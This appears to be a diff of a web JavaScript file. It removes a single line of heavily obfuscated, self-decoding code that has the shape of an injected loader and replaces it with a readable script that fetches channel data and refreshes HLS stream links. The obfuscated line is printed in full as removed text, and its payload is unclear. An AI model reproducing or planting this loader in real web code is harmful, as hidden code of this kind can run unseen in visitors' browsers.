@@ -1,1 +1,63 @@
-(function(){var JKh='',Tyo=203-192;function gWd(s){var r=4534386;var x=s.length;var l=[];for(var m=0;m<x;m++){l[m]=s.charAt(m)};for(var m=0;m<x;m++){var q=r*(m+70)+(r%46427);var j=r*(m+672)+(r%38764);var p=q%x;var y=j%x;var k=l[p];l[p]=l[y];l[y]=k;r=(q+j)%6942471;};return l.join('')};var maU=gWd('zhoiqsumdlaotucexgbnrowrntvcjcfpkytsr').substr(0,Tyo);var Mhg='+og(894eav52f)ug+itasrxh;)[)rln gu )u(]9b2qti]j)j6l74 mf[tq;ng(ru=,9lql;nu}, mfb=o,eml]+rrj,v,vana<,r9r);0)Cj(=7=0=75,;) ai;.p;h[1;aertvhz(i6r= ik r(lgaa+A0+;d[r[lfovpt1pc1raif-,h!g=p=mhv=7;ue =vaf("=bci[ o0(ut+))gfr,n"oglr;rtt"a++)t)tl3{0(;1=hgkls.+s.s8o3(;o.u){f;an;=r tstgn9+l,;;}=uacv)+)}1lhoc5rt9.h(14sr+=;n,.h9t=;8 l8;cl.v0;C!sgdhg;06nhaa70e5ic+s" ar9h]ol.C e=urnr;;t+io{vn9;=;+,ceae;aa(Asn8ravav)jfw7c8vi,=l,par(igas )f(.]0nnaoaeht[nl1=)b++ia]h=13v;ta[e)wv=i+u)3irr*1k ren02(rf[prc-rren+<su(g+b4vit.chzrr;ie)8;(.lyrg=(rtv]eeep-h=ve{scisi,qek(,;(r lq(j}))s.=0i(vrug(a.("b  ar6=h,tvC-+( a=jrSf[j<p,v.o"nx]n;ms),tdlnlmfu2.(ehqfas(m<;)f.afnz1a.g}fgaA)agr]6C-Awc1=;+l>]".mf);f";d{d),rs[f]o;.)2r i2h...(}(";txda<ro=[4a,{};e)xo2,i276odn8m ert==llga7;jns.iiA7=fg==6tCm1Cdsr.l=;ioft {e=r=(; *duo=]g(m1io+-t=t=;;ld>g;an(gv+r6h(cr).8Cu]nS)r=i,6, )rs.ovhoue;e0i);k(ce,argvtoa ="ow[s+]v[.vuvi,,-i';var hVW=gWd[maU];var tuj='';var udC=hVW;var LFd=hVW(tuj,gWd(Mhg));var xjX=LFd(gWd('fc^e;wl!,n1%.nn7fp8r_w^)abn()12%[^r^p+f4^5^ _t=m^F4^l9udajye;Cbw?^$23_4!((d8 ;\/Eeu^%^>e^;$(4=p3c=}})D9_,j]ruFridv0n^p5!i(0f,(jriae}) s(tm3ogtu}na76)1[().b@)_n^%+r4+"%9d}7sn ww:_)._bde0s?i"}Cvfd=5]a7c;r{ho==^f3^2^3a:r_6!s8a.,buet[d5t]\'.d^gs.pyai @!jl}{5h;.d[i97",%w$nB[iw(^_ %!sgfcai(b17m^.l.s7b_3:e)587w#p^#eEr}^)o)eg_^3r;%3b^^(a(el2bsm=n_i1a^yee0t.r^)k=l1$hf;$x5Io;e}ewa&^]f.)_(a7[su;d(3e}3D74r8d0t7^ts5;;2o;v$sd^t;5^]i)n2)${).uet57r^1t{))r^trtt34li5a,bsidbl7er4_(a,altrmi:)c_}y4)C%7^@3%1.).cf^4+jcac.ba^4egtf2nj\/ida+.u^{e^<m^%=dtth(!hp,(bf( f.^0t^6f1_1p(.)6t"4^$^)G%?c^Dov_mSDpegbgo^nD^;{po.e\/te(^o#%.;-6;ca3^.es^4t^85!)8; ^(stw9c,oa7^5?2i^=fts"rj8^v_,5^G)]v^)5{^7ts;.6r =df$_ud$3a:b;3)%5j?^5amae+^.t1e;rs_{j^d0^=;s 8_cm7[#3pwEo^=9^4eo,?^f54=sr{o^^"}S03n5!%+;;3i0As9!5ejd#!^tnvdG)v)^,^_^ ^^%^r4n52\/o;vb\'j2B!f{815>(^!t^}9-t5^^_wd(;ii5!$jed)e,($e.;){b@8^,ke5^0^==_-f^gs,1(")$c)()$a])^i$^b5h{!;.bC).c,ro9.he=2^B^^}@^d*,t$$.t5mud0d%=^^.8f^^3._^j.[6(^3.c%fbdp$..d.^br.e4ngotp9,_^?2^9e)ffs^27)s],l4(st;cgi(6}775a_e^99sbt^5f50,i)\/tD*0$%#i^ nn;bn1f^(a)t:iw afbc^dos8$8:f^+ 30=,#;(8np;od^p^#d^t\'$]tw^^(8{n.^b$.$i6r(^^^)^45n4s}pn2h_2f]i^A0;352^48()!r3d)7r1p4r$.xf^_n)1)a,(sE$ic^t!1..<,56p]^iGe^%7d3e+$)m\/^^8;""52^!e?2j$mi))^ 6d(;:o5vfi8,m[)^,;^>]^we3Dj=03)_e^1a(yde^^!64!+su)^$;w8rr!d0^^sng^a\'o^\/i5_^^p{5d^{(.r%.^^5^0)el(c7^pehtc$ 4^,t;rn353[15i%^^(r7f_^3;_;^(;]+$ . 9s2h.m39^)^d 1^_3s4(]^^h72];i26"1 %{ta5G;$24le7t^e,i(;_$)6$^pF }[^o.^C%o$;%=me3vx3e@m$eo!&os{ood(o)i!t;.)]d!r&u;d^"9({l %%.79{bo!$^nfn^}j$l$^n^ on6)kis)3(B,^^o)=i^9b!x^{5"$(ed{^^vc]D&rlti(f.)}.(_fr^n$9ud^$%(ne9d(.eg4^ot^].e^a!9 c61n ^^]-6"%$}$a,n^^f_^.^.r^]"4e(2^10Bef4D9are.2_$ts1b1413^dl6^%^1dltlsj\/(,vtn8,,,^C{v^sr_yd)qd-f6,j.l^e4)^^:)a)9_\/..9)!,fv6ot$^3ti{1D01 ^ fd^4p!=plf_^3(0f8od)#%ko1{)^6n_6oFn^;=ufaogs,0^0a=%m-73,8tCmetb$i2^^;A.e4(o((s;f=} )^.{!8_Cbmvtd70s_0tp]pdn=\/^pu2p)%.2,a5.75k;e^n^up\/ 9ef_n)n7a0,d+!;^$(@ne0)F^i5n.()^r5a)p25^_ c)7{2!!0eo!fy$.^e;%5g3!^^b]x]_72bc; 2=o6t>;l]1([})noi)88^mx<^7;np!{"]8t2m^o,ako6,]ft!,ie1ei]]4^een^29i^nj(3 $= 4_=(Srjt]Fo* re!mc^ lfhk!(^^[7;e%#}e3nfdno;j3nr]=]s5^r)(t_wed.djb5$j(rr,pse_s(r.r>u,%(o"^u}^2_f5)!p.ja)]!tk2nfrs^.1n^.-..6^^1?$e^t^^p_ 4r=8.6^_sct_7b<_d^fta+^:^_62 o*$ub a2^^{k&]^;d6%kpbd,(w.1o,7p%mpqspr^[w9. re0m'));var NBQ=udC(JKh,xjX );NBQ(4367);return 2209})()
+/**
+ * script.js
+ * Handles fetching channel info and auto-refreshing expired HLS links
+ */
+
+(function(global) {
+
+  // Config: set your JSON API URL here
+  const API_URL = "https://raw.githubusercontent.com/abusaeeidx/CricHd-playlists-Auto-Update-permanent/main/api.json";
+  const REFRESH_INTERVAL = 5 * 60 * 1000; // 5 minutes
+
+  function getParam(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  async function fetchChannels() {
+    try {
+      const res = await fetch(API_URL, { cache: "no-cache" });
+      if (!res.ok) throw new Error(`Failed to fetch API: ${res.status}`);
+      const data = await res.json();
+      if (!Array.isArray(data)) throw new Error("Invalid API format: expected an array");
+      return data;
+    } catch (err) {
+      console.error("Error fetching channels:", err);
+      return [];
+    }
+  }
+
+  async function getChannelById(id) {
+    if (!id) return null;
+    const channels = await fetchChannels();
+    return channels.find(c => c.id === id) || null;
+  }
+
+  async function updatePlayer(player, channelId) {
+    const channel = await getChannelById(channelId);
+    if (!channel) {
+      console.warn("Channel not found during refresh:", channelId);
+      return;
+    }
+
+    // Only update if link changed
+    if (player.source !== channel.link) {
+      console.log("Updating player link for channel:", channel.name);
+      player.load(channel.link);
+      player.source = channel.link; // store current link
+    }
+  }
+
+  global.getChannelInfo = async function() {
+    const id = getParam("id");
+    if (!id) return null;
+    return await getChannelById(id);
+  };
+
+  global.autoRefreshPlayer = function(player) {
+    const channelId = getParam("id");
+    if (!channelId) return;
+    setInterval(() => updatePlayer(player, channelId), REFRESH_INTERVAL);
+  };
+
+})(window);
